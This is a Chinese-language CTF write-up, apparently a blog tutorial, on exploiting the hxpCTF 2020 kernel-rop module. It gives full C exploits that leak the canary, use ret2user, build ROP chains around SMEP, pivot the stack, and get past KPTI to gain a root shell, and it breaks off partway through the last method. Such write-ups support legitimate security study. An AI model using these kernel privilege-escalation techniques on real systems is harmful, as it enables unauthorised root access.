## Linux Kernel 介绍

Linux 内核是 Linux操作系统的核心组件，它提供了操作系统的基本功能和服务。它是一个开源软件，由Linus Torvalds 在 1991
年开始开发，并得到了全球广泛的贡献和支持。

Linux内核的主要功能包括进程管理、内存管理、文件系统、网络通信、设备驱动程序等。它负责管理计算机硬件和软件资源，并为应用程序提供必要的基础支持。Linux内核是一个模块化的系统，可以根据需要加载和卸载各种驱动程序和功能模块。

## Linux Kernel 环境

  * vmlinuz或bzImage：linux内核的压缩镜像

  * vmlinux：linux内核的符号表

  * initramfs.cpio.gz：文件系统，有系统启动的信息

  * run.sh：qemu启动的shell脚本，里面有linux内核开启了哪些保护

## Linux Kernel gadget获取

通过压缩的linux内核镜像获取符号表

    
    
    ./extract-image.sh ./vmlinuz > vmlinux

extract-image.sh

    
    
    #!/bin/sh  
    # SPDX-License-Identifier: GPL-2.0-only  
    # ----------------------------------------------------------------------  
    # extract-vmlinux - Extract uncompressed vmlinux from a kernel image  
    #  
    # Inspired from extract-ikconfig  
    # (c) 2009,2010 Dick Streefland <dick@streefland.net>  
    #  
    # (c) 2011      Corentin Chary <corentin.chary@gmail.com>  
    #  
    # ----------------------------------------------------------------------  
    ​  
    check_vmlinux()  
    {  
    # Use readelf to check if it's a valid ELF  
    # TODO: find a better to way to check that it's really vmlinux  
    #       and not just an elf  
    readelf -h $1 > /dev/null 2>&1 || return 1  
    ​  
    cat $1  
    exit 0  
    }  
    ​  
    try_decompress()  
    {  
    # The obscure use of the "tr" filter is to work around older versions of  
    # "grep" that report the byte offset of the line instead of the pattern.  
    ​  
    # Try to find the header ($1) and decompress from here  
    for pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`  
    do  
    pos=${pos%%:*}  
    tail -c+$pos "$img" | $3 > $tmp 2> /dev/null  
    check_vmlinux $tmp  
    done  
    }  
    ​  
    # Check invocation:  
    me=${0##*/}  
    img=$1  
    if  [ $# -ne 1 -o ! -s "$img" ]  
    then  
    echo "Usage: $me <kernel-image>" >&2  
    exit 2  
    fi  
    ​  
    # Prepare temp files:  
    tmp=$(mktemp /tmp/vmlinux-XXX)  
    trap "rm -f $tmp" 0  
    ​  
    # That didn't work, so retry after decompression.  
    try_decompress '\037\213\010' xy    gunzip  
    try_decompress '\3757zXZ\000' abcde unxz  
    try_decompress 'BZh'          xy    bunzip2  
    try_decompress '\135\0\0\0'   xxx   unlzma  
    try_decompress '\211\114\132' xy    'lzop -d'  
    try_decompress '\002!L\030'   xxx   'lz4 -d'  
    try_decompress '(\265/\375'   xxx   unzstd  
    ​  
    # Finally check for uncompressed images or objects:  
    check_vmlinux $img  
    ​  
    # Bail out:  
    echo "$me: Cannot find vmlinux." >&2

 **ROPgadget获取**

不建议用ROPgadget，速度比较慢

    
    
    ROPgadget --binary ./vmlinux > gadgets.txt

 **Ropper获取**

使用ropper速度会比较快

    
    
    ropper --file ./vmlinux --nocolor > g

 **直接获取**

    
    
    ./vmlinux > gadgets.txt

然后搜索

    
    
    cat gadgets.txt | grep 'pop'

## 文件系统

 **解包**

    
    
    mkdir initramfs  
    cd initramfs  
    cp ../initramfs.cpio.gz .  
    gunzip ./initramfs.cpio.gz  
    cpio -idm < ./initramfs.cpio  
    rm initramfs.cpio

 **打包**

    
    
    gcc -o exploit -static $1  
    mv ./exploit ./initramfs  
    cd initramfs  
    find . -print0 \  
    | cpio --null -ov --format=newc \  
    | gzip -9 > initramfs.cpio.gz  
    mv ./initramfs.cpio.gz ../

## Linux Kernel的保护措施

  * Kernel stack cookies【canary】：防止内核栈溢出

  * Kernel address space layout【KASLR】：内核地址随机化

  * Supervisor mode executionprotection【SMEP】：内核态中不能执行用户空间的代码。在内核中可以将CR4寄存器的第20比特设置为1，表示启用。

    * 开启：在-cpu参数中设置+smep

    * 关闭：nosmep添加到-append

  * Supervisor Mode AccessPrevention【SMAP】：在内核态中不能读写用户页的数据。在内核中可以将CR4寄存器的第21比特设置为1，表示启用。

    * 开启：在-cpu参数中设置+smap

    * 关闭：nosmap添加到-append

  * Kernel page-tableisolation【KPTI】：将用户页与内核页分隔开，在用户态时只使用用户页，而在内核态时使用内核页。

    * 开启：kpti=1

    * 关闭：nopti添加到-append

 **hxpCTF 2020 kernel-rop**

这里使用hxpCTF2020的内核题作为例子，对内核中的保护以及如何绕过做简单介绍。

项目地址：<https://github.com/h0pe-ay/Kernel-Pwn>

 **hackme_read**

这个函数会将内核栈的数据拷贝到用户空间中去，因此可以利用改函数泄露内核栈的信息

 **hackme_write**

hackme_write这个函数则是从用户空间拷贝数据到内核栈中，但是变量V5的存储空间是远远小于从用户态中可以传的数据的大小，因此导致了出现内核态栈溢出。

## 动态调试

首先在启动脚本`run.sh`中加入`-s`的参数，使得可以使用gdb对qemu进行调试

其次可以使用`lsmod`查看模块加载的基址，这里需要注意的是需要先将启动脚本中的权限改为0

否则直接运行不会显示模块的地址，结果如下

将权限修改为0之后，就可以正常显示了

![202307031555871.png](https://image.3001.net/images/20230704/1688435799_64a37c57b4736354281e4.png!small)

然后通过gdb进行调试时则可以将模块的基地址加入进去，使用`add-symbol-file hackme.ko 0xffffffffc0000000`

![202307031555873.png](https://image.3001.net/images/20230704/1688435801_64a37c598acf74475b3f7.png!small)

接着是从题目给的内核镜像中提取符号信息，通过`./extract-image.sh vmlinuz > vmlinux`，并且也加载到gdb中

![202307031555874.png](https://image.3001.net/images/20230704/1688435802_64a37c5a7f851a22292c4.png!small)

最后就可以开启远程调试了，`target remote:1234`

![202307031555875.png](https://image.3001.net/images/20230704/1688435803_64a37c5b6b1b44352a83c.png!small)

这里需要注意的是`ida`中显示的地址可能不准确，因此可以直接在`qemu`中查看，`cat /proc/kallsyms | grep hackme`

![202307031555876.png](https://image.3001.net/images/20230704/1688435804_64a37c5c78c2052e84972.png!small)

在`hackme_write`中打下断点

![202307031555877.png](https://image.3001.net/images/20230704/1688435805_64a37c5d995e72bbce065.png!small)

这里我遇到个问题是在遇到`push`指令时不能够使用`ni`进行跟踪，而是需要`si`，否则会跑飞。

使用`ni`进行单步调试，程序会直接运行，无法断下来。

![202307031555878.png](https://image.3001.net/images/20230704/1688435806_64a37c5eaaa4bef77e2fc.png!small)

使用`si`则可以单步

![202307031555879.png](https://image.3001.net/images/20230704/1688435808_64a37c6050c88ee40ebbb.png!small)

至此就可以对hackme.ko的模块进行调试了。

## 未开启保护

首先是关闭内核中所有的保护，在遇到内核栈溢出时需要怎么完成漏洞利用。

 **run.sh**

在`append`使用使用`nosmap`、`nosemp`、`nokaslr`、`nopti`关闭`smap`、`semp`、`kaslr`以及`kpti`的保护

    
    
    qemu-system-x86_64 \  
    -m 128M \  
    -cpu kvm64\  
    -kernel vmlinuz \  
    -initrd initramfs.cpio.gz \  
    -hdb flag.txt \  
    -snapshot \  
    -nographic \  
    -monitor /dev/null \  
    -no-reboot \  
    -append "console=ttyS0 nosmap nosemp nokaslr nopti  quiet panic=1" \  
    -s

 **ret2user**

由于题目没有开启任何保护，因此首要使用的方法就是利用栈溢出修改内核栈上的返回地址。

首先检查一下保护，发现hackme.ko开启的canary的保护，因此想要完成栈溢出，首先需要泄露canary，由于题目本身就存在地址泄露功能，因此只要确保我们读取的内容包括canary的值即可

![202307031555880.png](https://image.3001.net/images/20230704/1688435809_64a37c61b2bdcbebccdd4.png!small)

在`hackme_read`中打下断点，查看变量`v6`中存储了什么值，由于程序是通过`memcpy`进行数据拷贝的，因此直接查看`RSI`寄存器对应的数据

![202307031555881.png](https://image.3001.net/images/20230704/1688435810_64a37c62cc205d082f65c.png!small)

可以发现`canary`的值就在其中，因此利用`hackmeread`这个函数就可以将数据泄露出来

![202307031555882.png](https://image.3001.net/images/20230704/1688435812_64a37c643aef393fc7f3d.png!small)

![202307031555883.png](https://image.3001.net/images/20230704/1688435813_64a37c658a3006c99eb6d.png!small)

这里需要注意的是，虽然题目限制的长度是0x1000，但是并不能将拷贝0x1000的长度，因为可能会在不可读的地址中获取数据，导致了执行错误。

![202307031555884.png](https://image.3001.net/images/20230704/1688435814_64a37c66858777e694fd1.png!small)

在泄露`canary`后就可以劫持程序执行流程了，与用户态不同，在内核态需要先获取`root`凭证，在切换到用户态下。

  * `prepare_kernel_cred`函数

    * `prepare_kernel_cred`函数用于为内核中的进程（也就是进程的内核线程）创建一个新的`cred`结构体，该结构体包含有关进程的安全上下文信息，例如UID、GID、capabilities 等。

  * `commit_creds`函数

    * `commit_creds`函数接受一个指向 `cred`结构体的指针，并将其分配给当前进程。该函数通常在进程启动时调用，以确保进程被正确配置以拥有所需的权限。

因此调用`prepare_kernel_cred(0)`可以获取`root`权限的凭证，接着调用`commit_creds`函数，就可以将当前进程的特权修改为`root`。即指向`commit_creds(prepare_kernel_cred(0))`

在获取完`root`之后则需要调用`swags`指令进行`GS`寄存器的切换，即将`g_base`与`k_gs_base`的值进行交换，`swapgs`是一个汇编指令，用于在执行内核代码期间切换当前
CPU 的内核栈和 GS寄存器。完成交换之后才能确保在用户态的寻址不会存在问题。

执行`swags`指令之前

![202307031555885.png](https://image.3001.net/images/20230704/1688435815_64a37c678df4b72085732.png!small)

执行`swags`指令之后

![202307031555886.png](https://image.3001.net/images/20230704/1688435817_64a37c69254369346f605.png!small)

最后则是切换回用户态，`iretq`指令是 x86架构下用于从中断处理程序（或系统调用处理程序）返回到用户空间的指令。它是`iret`指令的 64
位版本，用于在 64 位模式下使用。

`iretq`指令有以下三个功能：

  1. 恢复处理器的标志寄存器 (EFLAGS)的值，以便返回到原始程序的执行上下文。

  2. 恢复程序计数器 (Instruction Pointer, RIP)的值，以便返回到原始程序的执行点。

  3. 恢复栈指针 (Stack Pointer, RSP) 的值，以便将堆栈指针切换回用户栈上。

`iretq`还原的值的顺序为`RIP|CS|RFLAGS|SP|SS`，那么在`iret`指令中按顺序填充`RIP`、`CS`、`RFLASG`、`RSP`以及`SS`的值即可，因此在执行`iretq`之前需要将在用户态下将这些值进行保存。并且`RIP`指向的值为`system("/bin/sh")`函数的地址即可。

保存寄存器的汇编代码如下

    
    
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );

在`iretq`指令后跟随的值如下

![202307031555887.png](https://image.3001.net/images/20230704/1688435818_64a37c6abec8e62f1e33b.png!small)

 **exp**

因此最后构造的`exp`如下

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds   
    0xffffffff814c67f0 T prepare_kernel_cred   
    */  
    unsigned long user_sp, user_cs, user_ss, user_rflags;  
    void save_user_land()  
    {  
    __asm__(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("[*] Saved userland registers");  
    printf("[#] cs: 0x%lx \n", user_cs);  
    printf("[#] ss: 0x%lx \n", user_ss);  
    printf("[#] rsp: 0x%lx \n", user_sp);  
    printf("[#] rflags: 0x%lx \n\n", user_rflags);  
    }  
    ​  
    void backdoor()  
    {  
    printf("****getshell****");  
    system("id");  
    system("/bin/sh");  
    }  
    ​  
    unsigned long user_rip = (unsigned long)backdoor;  
    ​  
    void lpe()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred  
    "xor rdi, rdi;"  
    "call rax;" //prepare_kernel_cred(0);  
    "mov rdi, rax;"  
    "mov rax, 0xffffffff814c6410;"  
    "call rax;"  
    "swapgs;"     
    "mov r15, user_ss;"  
    "push r15;"  
    "mov r15, user_sp;"  
    "push r15;"  
    "mov r15, user_rflags;"  
    "push r15;"  
    "mov r15, user_cs;"  
    "push r15;"  
    "mov r15, user_rip;"  
    "push r15;"  
    "iretq;"  
    ".att_syntax;"  
    );  
    }  
    ​  
    int main()  
    {  
    unsigned int i, index = 0;  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 8*11);  
    for(i = 0; i < 11; i++)  
    printf("i:%d:data:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long leak_addr = buf[10];  
    save_user_land();  
    unsigned long payload[256];  
    for(i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)lpe;  
    write(fd, payload, index * 8);  
    return 0;  
    }

## 绕过SMEP

`SMEP`保护是防止内核执行用户空间的代码，而上述的`exp`则是将利用过程是将汇编语言写在用户空间中，因此在`SMEP`的保护下，上述的利用会失效。下面将介绍绕过`SMEP`的几种方法。

 **run.sh**

    
    
    qemu-system-x86_64 \  
    -m 128M \  
    -cpu kvm64,+smep\  
    -kernel vmlinuz \  
    -initrd initramfs.cpio.gz \  
    -hdb flag.txt \  
    -snapshot \  
    -nographic \  
    -monitor /dev/null \  
    -no-reboot \  
    -append "console=ttyS0 nosmap  nokaslr nopti  quiet panic=1" \  
    -s

 **修改CR4寄存器**

前面说过开启`SMEP`保护实际是将`CR4`寄存器的第20比特位置为1

![202307031555888.png](https://image.3001.net/images/20230704/1688435820_64a37c6c29a1fbf782047.png!small)

那么一个简单的想法就是将`CR4`寄存器的第20比特位重写为0，关闭`SMEP`的保护就可以使用上述的利用手法了。那么写`cr4`寄存器的是通过`native_write_cr4`函数，将需要改写的值以参数的形式传入进去，因此此时需要一个`pop
rdi; ret`的`gadget`。

![202307031555889.png](https://image.3001.net/images/20230704/1688435821_64a37c6d6cc8754bedfc0.png!small)

找到`native_write_cr4`函数

![202307031555890.png](https://image.3001.net/images/20230704/1688435822_64a37c6e9e0d176c8fb3e.png!small)

 **exp**

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds   
    0xffffffff814c67f0 T prepare_kernel_cred   
    0xffffffff81006370: pop rdi; ret;   
    0xffffffff814443e0 T native_write_cr4  
    */  
    unsigned long user_sp, user_cs, user_ss, user_rflags;  
    void save_user_land()  
    {  
    __asm__(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("[*] Saved userland registers");  
    printf("[#] cs: 0x%lx \n", user_cs);  
    printf("[#] ss: 0x%lx \n", user_ss);  
    printf("[#] rsp: 0x%lx \n", user_sp);  
    printf("[#] rflags: 0x%lx \n\n", user_rflags);  
    }  
    ​  
    void backdoor()  
    {  
    printf("****getshell****");  
    system("id");  
    system("/bin/sh");  
    }  
    ​  
    unsigned long user_rip = (unsigned long)backdoor;  
    ​  
    void lpe()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred  
    "xor rdi, rdi;"  
    "call rax;" //prepare_kernel_cred(0);  
    "mov rdi, rax;"  
    "mov rax, 0xffffffff814c6410;"  
    "call rax;"  
    "swapgs;"     
    "mov r15, user_ss;"  
    "push r15;"  
    "mov r15, user_sp;"  
    "push r15;"  
    "mov r15, user_rflags;"  
    "push r15;"  
    "mov r15, user_cs;"  
    "push r15;"  
    "mov r15, user_rip;"  
    "push r15;"  
    "iretq;"  
    ".att_syntax;"  
    );  
    }  
    ​  
    int main()  
    {  
    unsigned int i, index = 0;  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 8*11);  
    for(i = 0; i < 11; i++)  
    printf("i:%d:data:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long leak_addr = buf[10];  
    save_user_land();  
    unsigned long payload[256];  
    for(i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; // pop rdi; ret;  
    payload[index++] = 0x00000000000060;   
    payload[index++] = 0xffffffff814443e0; //native_write_cr4  
    payload[index++] = (unsigned long)lpe;  
    write(fd, payload, index * 8);  
    return 0;  
    }

但是在这个版本下的内核已经无法通过`native_write_cr4`函数改写`CR4`寄存器了，可以通过`dmesg`打印日志信息，可以发现

![202307031555891.png](https://image.3001.net/images/20230704/1688435823_64a37c6fb3f1d674f567b.png!small)

提示`pinned CR4 bits changed:
0x100000!?`的错误，并且`CR4`的值也没有被修改，这是因为在当前的内核版本中增加了校验，若后续通过`native_write_cr4`函数修改的值与启动的值不一致则会报错，并且将值修改为回来的值。

![202307031555892.png](https://image.3001.net/images/20230704/1688435825_64a37c7166e5e18892b72.png!small)

可以看到补丁的说明，在启动后`CR4`的值无法被修改。因此在改利用手法只能在对CR4进行校验的版本下使用。

![202307031555893.png](https://image.3001.net/images/20230704/1688435826_64a37c72a7d879704d83f.png!small)

 **构造逃逸ROP**

由于`SMEP`只是杜绝了执行用户态的代码，因此利用`ROP`的思路，在内核态完成`ROP`链的构造，并且执行`commit_creds(prepare_kernel_cred(0))
-> swags -> iretq`的流程。

那么此时需要什么样的`gadget`则是构造逃逸`ROP`的重点，由于需要手动传参调用上述的攻击链，因此需要

  * `pop rdi; ret;`

  * `mov rdi , rax; ret`，这里需要注意的是，我们需要`prepare_kernel_cred(0)`执行的返回值，因此需要将`rax`寄存器的值传递给`rdi`寄存器

  * `swags; ret`

  * `iretq`

除了`mov rdi, rax; ret`以外，其余的`gadget`都可以很轻松的搜索出来，但是内核中不存在`mod rdi, rax;
ret`这样的`gadget`，因此需要想办法找到其他的`gadget`，这里我找到如下的组合，通过构造`rdi`与`rsi`的值，使得`rdi =
rsi`从而导致`jne`的跳转无法执行，那么就可以在执行`mov rdi, rax`的情况下可以跳过`jne`的跳转指令执行到`ret`指令。

    
    
    0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    0xffffffff81006370: pop rdi; ret;  
    0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    0xffffffff8150b97e: pop rsi; ret;

因此`ROP`逃逸的思路与在用户态的`ROP`区别不大，只要找到合适的`gadget`即可

 **exp**

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds   
    0xffffffff814c67f0 T prepare_kernel_cred   
    0xffffffff823d6b02: cmp rdi, 0xffffff; ret;  
    0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    0xffffffff81006370: pop rdi; ret;  
    0xffffffff8100a55f: swapgs; pop rbp; ret;   
    0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    0xffffffff814381cb: iretq; pop rbp; ret;  
    0xffffffff8150b97e: pop rsi; ret;  
    */  
    ​  
    //iretq RIP|CS|RFLAGS|SP|SS  
    unsigned long user_cs,user_rflags,user_sp,user_ss;  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("***save state***");  
    printf("user_cs:0x%lx\n", user_cs);  
    printf("user_sp:0x%lx\n", user_sp);  
    printf("user_ss:0x%lx\n", user_ss);  
    printf("user_rflags:0x%lx\n", user_rflags);  
    puts("***save finish***");  
    }  
    ​  
    void backdoor()  
    {  
    puts("***getshell***");  
    system("/bin/sh");  
    }
    
    
    int main()  
    {  
    save_state();  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 0x10 * 8);  
    for(int i = 0; i < 0x10; i++)  
    printf("i:%d\taddress:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
      
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c67f0; //prepare_kernel_cred  
    payload[index++] = 0xffffffff8150b97e; //pop_rsi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 1;  
    payload[index++] = 0xffffffff818c6b35; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0xffffffff8166fea3; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c6410; //commit_creds;  
    payload[index++] = 0xffffffff8100a55f; //swapgs; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814381cb; //iretq; pop rbp; ret;  
    payload[index++] = (unsigned long)backdoor;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
    }

 **栈迁移**

栈迁移能使用的场景是当我们需要构造的`ROP`链大于能溢出的字节数时采用的与用户态不同的是在内核中存在很多可以修改`RSP`指针的`gadget`可以使用。这里我找到的`gadget`是，通过`pop
rbp; ret`与`mov rsp, rbp`结合，就能够篡改`rsp`为任何值。

    
    
    0xffffffff818fa3ef: xor rax, rdx; pop rbp; ret;  
    0xffffffff810062dc: mov rsp, rbp; pop rbp; ret;

那么需要将`rsp`篡改为何值，此时就需要结合`mmap`函数，该函数能够在用户空间中开辟一段内存，该内存的属性可以自定义，因此思路则是将`rsp`的值指向`mmap`开辟的地址，通过栈迁移技术，将栈迁移到`mmap`的地址值，我们在将`ROP`链填充到`mmap`开辟的内存中即可，这里对`mmap`函数进行一个介绍。

 **mmap函数**

    
    
    void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);

  * `addr`：开辟的地址值，若为0则操作系统自行选择，否则为填充的值，该地址的值需要页对齐（0x1000），并且最小的值需要为`0x10000`（这里是我自己测试的）

  * `length`：内存的大小

  * `prot`：权限

    * PROT_EXEC，执行权限

    * PROT_READ，读权限

    * PROT_WRITE，写权限

    * PROT_NONE，没有任何权限

  * `flags`：标志位，`mmap`函数可以设置的标志位有很多，这里着重介绍一些常用的

    * `MAP_SHARED`：共享映射，映射的内容可以被其他进程所看到，同时能够同步到底层的文件

    * `MAP_PRIVATE`：私有映射，映射的内容不能被其他进程所看到，也不会同步到底层的文件

    * `MAP_ANONYMOUS`：匿名映射，是一种不映射文件的映射

    * `MAP_FIXED`：固定映射，即映射地址必须是`addr`所指定的，若该地址被占用则`mmap`返回错误

  * `fd`：需要映射的文件描述符，若是匿名映射则设置为-1

  * `offet`：映射的偏移，即选择从哪个位置开始映射

映射代码如下，这里需要注意的是，由于我们只需要在用户空间中任意开辟一段可执行的内存，因此只需要进行匿名映射，并且地址值需要固定。因此`MAP_ANONYMOUS`与`MAP_FIXED`的标志位需要被指定，然后是`MAP_SHARED`与`MAP_PRIVATE`必须两个中指定一个，否则也会报错，因为这两个参数指明的是修改的内容是否会影响其他进程或者是底层的文件。

![202307031555894.png](https://image.3001.net/images/20230704/1688435827_64a37c73aad8ab8e419ec.png!small)

栈迁移完成

![202307031555895.png](https://image.3001.net/images/20230704/1688435828_64a37c74c45572a042398.png!small)

将`ROP`链部署在了映射内存中

![202307031555896.png](https://image.3001.net/images/20230704/1688435831_64a37c772b48b57835393.png!small)

最后是遇到的小疑惑，刚开始学习到栈迁移的时候会觉得奇怪，因为`mmap`开辟的内存是在用户态的，`SMEP`则是禁止执行用户态的代码，为什么使用栈迁移可以绕过`SMEP`，后面理解发现，我们只是访问了用户空间的地址即`0x2000`，但是这段用户态空间填写的地址都是内核态的地址，因此总结流程则是我们在用户态空间中填充了内核态的地址，在进行栈迁移绕过`SMEP`时，仅仅是访问了用户态空间的地址，最后执行时还是执行的内核态的地址，因此`SMEP`无法阻碍这种利用。而这也正是`SMAP`与`SMEP`的区别，`SMAP`则是无法读写用户态空间，因此若开启了`SMAP`，那么该利用手法则无法进行。

## 绕过KPTI

KPTI（Kernel Page Table Isolation）是一种针对 Intel处理器的内核保护机制，用于减轻 Spectre 和 Meltdown
等 CPU可以被利用的安全漏洞所造成的影响。KPTI的主要目的是隔离内核地址空间和用户地址空间，防止恶意程序通过访问内核地址空间来窃取敏感数据。

简单来说就是KPTI的保护即将用户空间的页与内核内核空间的页完全分隔开，那么在使用上述代码进行利用的时候会报出段错误，因为在内核空间的页中没办法找到用户空间的代码。

![202307031555897.png](https://image.3001.net/images/20230704/1688435832_64a37c7889a80f32e3742.png!small)

那么有两种方式可以绕过`KPTI`

  * 捕获`Segmentation fault`的异常，在异常处理中调用`system(/bin/sh)`

  * 切换页表，将内核空间的页表切换到用户空间中去

 **run.sh**

    
    
    qemu-system-x86_64 \  
    -m 128M \  
    -cpu kvm64,+smep\  
    -kernel vmlinuz \  
    -initrd initramfs.cpio.gz \  
    -hdb flag.txt \  
    -snapshot \  
    -nographic \  
    -monitor /dev/null \  
    -no-reboot \  
    -append "console=ttyS0 nosmap  nokaslr kpti=1  quiet panic=1" \  
    -s

 **使用异常处理**

使用异常处理非常简单，只需要注册一个异常处理的函数去捕获`SIGSEGV`信号，在捕获到该信号时执行异常处理函数，可自定义为`system("/bin/sh")`

    
    
    signal(SIGSEGV, backdoor);

 **exp**

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    #include <signal.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds   
    0xffffffff814c67f0 T prepare_kernel_cred   
    0xffffffff823d6b02: cmp rdi, 0xffffff; ret;  
    0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    0xffffffff8166ff23: mov rdi, rax; jne 0x86fef3; pop rbx; pop rbp; ret;  
    0xffffffff81006370: pop rdi; ret;  
    0xffffffff8100a55f: swapgs; pop rbp; ret;   
    0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    0xffffffff814381cb: iretq; pop rbp; ret;  
    0xffffffff8150b97e: pop rsi; ret;  
    */  
    ​  
    //iretq RIP|CS|RFLAGS|SP|SS  
    unsigned long user_cs,user_rflags,user_sp,user_ss;  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("***save state***");  
    printf("user_cs:0x%lx\n", user_cs);  
    printf("user_sp:0x%lx\n", user_sp);  
    printf("user_ss:0x%lx\n", user_ss);  
    printf("user_rflags:0x%lx\n", user_rflags);  
    puts("***save finish***");  
    }  
    ​  
    void backdoor()  
    {  
    puts("***getshell***");  
    system("/bin/sh");  
    }
    
    
    int main()  
    {  
    save_state();  
    signal(SIGSEGV, backdoor);  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 0x10 * 8);  
    for(int i = 0; i < 0x10; i++)  
    printf("i:%d\taddress:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
      
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c67f0; //prepare_kernel_cred  
    payload[index++] = 0xffffffff8150b97e; //pop_rsi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 1;  
    payload[index++] = 0xffffffff818c6b35; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0xffffffff8166fea3; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c6410; //commit_creds;  
    payload[index++] = 0xffffffff8100a55f; //swapgs; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814381cb; //iretq; pop rbp; ret;  
    payload[index++] = (unsigned long)backdoor;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
    }

 **使用swapgs_restore_regs_and_return_to_usermode**

第二种方式则是修改页表，CR3 寄存器是 x86架构中的一种控制寄存器，用于存储页目录表（Page
DirectoryTable）的物理地址。因此若能够修改CR3的值为用户空间的页表，那么就可以完成页表的切换，从而正常执行利用代码了。

那么在内核中存在一个函数`swapgs_restore_regs_and_return_to_usermode`，`swapgs_restore_regs_and_return_to_usermode`函数是在
x86架构中用于从内核态切换到用户态的汇编代码片段。这个函数的作用是在内核态执行完系统调用或中断处理程序后，恢复用户态进程的寄存器状态，并返回到用户态进程的执行点继续执行。

在内核中搜索该函数的地址

![202307031555898.png](https://image.3001.net/images/20230704/1688435833_64a37c79a8c66c85a0379.png!small)

